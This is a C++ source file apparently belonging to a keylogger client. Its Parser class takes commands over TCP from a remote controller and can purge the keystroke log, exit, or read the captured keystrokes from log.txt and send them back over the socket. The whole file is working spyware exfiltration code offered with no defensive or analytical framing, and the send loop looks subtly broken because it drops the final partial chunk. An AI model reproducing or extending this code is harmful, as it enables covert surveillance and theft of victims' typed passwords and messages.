#include <fstream>

#include "TCPClient.hpp"
#include "Parser.hpp"

Parser::Parser(TCPClient &client) :
	m_client(client)
{
}


Parser::~Parser()
{
}

void Parser::parseCommands()
{
	int read = m_client.receiveData(&m_buffer, sizeof(t_cmd));
	if (read > 0 && WSAGetLastError() != EAGAIN && WSAGetLastError() != EWOULDBLOCK)
	{
		if (read == sizeof(t_cmd))
		{
			t_cmd *command = reinterpret_cast<t_cmd *>(m_buffer);
			if (command->cmd == commandType::CLOSE)
			{
				exit(0);
			}
			if (command->cmd == commandType::PURGE_LOG)
			{
				KeyLogger::getInstance().stopRecording();
				std::cout << "Log Purge...";
				KeyLogger::getInstance().purgeLog();
				std::cout << " Done" << std::endl;
				KeyLogger::getInstance().startRecording();
			}
			if (command->cmd == commandType::DOWNLOAD_LOG)
			{
				std::ifstream file("./log.txt");
				std::cout << "Sending log...";
				t_cmd tosend;
				KeyLogger::getInstance().stopRecording();
				m_client.blockSocket();
				if (file.is_open())
				{
					while (file.read(tosend.buffer, buffer_size))
					{
						tosend.cmd = commandType::DOWNLOAD_LOG;
						tosend.data_len = file.gcount();
						m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
					}
				}
				file.close();
				tosend.cmd = commandType::DOWNLOAD_LOG_END;
				tosend.data_len = 0;
				m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
				m_client.unblockSocket();
				std::cout << " Done" << std::endl;
				KeyLogger::getInstance().startRecording();
			}
			if (command->cmd == commandType::DISPLAY_LOG)
			{
				std::ifstream file("./log.txt");
				std::cout << "Sending log...";
				t_cmd tosend;
				KeyLogger::getInstance().stopRecording();
				m_client.blockSocket();
				if (file.is_open())
				{
					while (file.read(tosend.buffer, buffer_size))
					{
						tosend.cmd = commandType::DISPLAY_LOG;
						tosend.data_len = file.gcount();
						m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
					}
				}
				file.close();
				tosend.cmd = commandType::DISPLAY_LOG_END;
				tosend.data_len = 0;
				m_client.sendData(reinterpret_cast<char *>(&tosend), sizeof(t_cmd));
				m_client.unblockSocket();
				std::cout << " Done" << std::endl;
				KeyLogger::getInstance().startRecording();
			}
		}
	}
}